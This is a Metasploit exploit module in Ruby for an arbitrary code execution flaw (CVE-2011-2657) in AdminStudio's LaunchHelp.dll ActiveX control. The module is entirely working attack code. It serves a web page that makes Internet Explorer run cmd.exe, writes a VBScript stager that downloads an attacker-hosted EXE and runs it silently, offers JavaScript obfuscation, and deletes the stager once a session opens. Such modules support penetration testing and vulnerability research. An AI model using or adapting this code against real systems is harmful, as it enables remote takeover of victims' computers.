##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AdminStudio LaunchHelp.dll ActiveX Arbitrary Code Execution',
			'Description'    => %q{
					This module exploits a vulnerability in AdminStudio LaunchHelp.dll ActiveX control. The
				LaunchProcess function found in LaunchHelp.HelpLauncher.1 allows remote attackers to run
				arbitrary commands on the victim machine. This module has been successfully tested with the
				ActiveX installed with AdminStudio 9.5, which also comes with Novell ZENworks Configuration
				Management 10 SP2, on IE 6 and IE 8 over Windows XP SP 3.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
					[
						'rgod', # Vulnerability discovery
						'juan' # Metasploit module
					],
			'References'     =>
				[
					[ 'CVE', '2011-2657' ],
					[ 'OSVDB', '76700'],
					[ 'BID', '50274' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-318/' ],
					[ 'URL', 'http://www.novell.com/support/viewContent.do?externalId=7009570&sliceId=1' ],
				],
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
				},
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# LaunchHelp.dll 9.5.0.0
					[ 'Windows Universal',  {} ],
				],
			'DisclosureDate' => 'Oct 19 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('WINDOWSTEMP', [ true, "The Windows temporal folder.", "C:/Windows/Temp" ]),
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false]),
			], self.class)
	end

	def on_new_session(client)
		if client.type != "meterpreter"
			print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
			print_error("The vbs stager and exe payload must be removed manually.")
			return
		end

		# stdapi must be loaded before we can use fs.file
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

		begin
			print_status("Deleting the vbs payload \"#{@stager_name}\" ...")
			client.fs.file.rm("#{@temp_folder}/#{@stager_name}")
			print_good("The vbs stager has been deleted successfully")
			print_status("The exe payload #{@temp_folder}/#{@payload_name}.exe must be removed manually")
		rescue ::Exception => e
			print_error("Problems while the clenaup")
			print_status("The vbs stager #{@temp_folder}/#{@stager_name} must be removed manually")
			print_status("The exe payload #{@temp_folder}/#{@payload_name}.exe must be removed manually")
			print_error("Exception: #{e.inspect}")
			return
		end
	end

	# Stager wrote by sinn3r to avoid problems when echoing the vbs cmdstager too many times.
	# See "real_arcade_installerdlg.rb" for more information.
	def build_vbs(url)
		name_xmlhttp = rand_text_alpha(2)
		name_adodb = rand_text_alpha(2)

		tmp = "#{@temp_folder}/#{@stager_name}"

		vbs = "echo Set #{name_xmlhttp} = CreateObject(\"Microsoft.XMLHTTP\") "
		vbs << ": #{name_xmlhttp}.open \"GET\",\"http://#{url}\",False : #{name_xmlhttp}.send"
		vbs << ": Set #{name_adodb} = CreateObject(\"ADODB.Stream\") "
		vbs << ": #{name_adodb}.Open : #{name_adodb}.Type=1 "
		vbs << ": #{name_adodb}.Write #{name_xmlhttp}.responseBody "
		vbs << ": #{name_adodb}.SaveToFile \"#{@temp_folder}/#{@payload_name}.exe\",2 "
		vbs << ": CreateObject(\"WScript.Shell\").Run \"#{@temp_folder}/#{@payload_name}.exe\",0 >> #{tmp}"
		return vbs
	end

	def exploit
		@payload_name = rand_text_alpha(4)
		@temp_folder = datastore['WINDOWSTEMP']
		@stager_name = rand_text_alpha(6) + ".vbs"
		super
	end

	def on_request_uri(cli, request)

		agent = request.headers['User-Agent']

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if not agent =~ /MSIE/
			print_error("Browser not supported: #{agent}")
			send_not_found(cli)
			return
		end

		if request.uri =~ /\.exe/
			print_status("Sending payload EXE")
			return if ((p=regenerate_payload(cli)) == nil)
			data = generate_payload_exe( {:code=>p.encoded} )
			send_response(cli, data, {'Content-Type' => 'application/octet-stream'} )
			return
		end

		# Payload's URL
		payload_src = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		payload_src << ":" << datastore['SRVPORT'] << get_resource() + "/" + @payload_name + ".exe"

		# Create the stager (download + execute payload)
		stager = build_vbs(payload_src)

		js = <<-JS
		var actvx = new ActiveXObject('LaunchHelp.HelpLauncher.1');
		actvx.LaunchProcess("cmd.exe", '/c #{stager}');
		actvx.LaunchProcess("cmd.exe", "/c start #{@temp_folder}/#{@stager_name}");
		JS

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		html = <<-EOS
		<html>
		<body>
		<script>
		#{js}
		</script>
		</body>
		</html>
		EOS

		# Remove extra tabs
		html = html.gsub(/^\t\t/, "")

		print_status("Sending #{self.name}")
		send_response(cli, html, { 'Content-Type' => 'text/html' })
	end
end
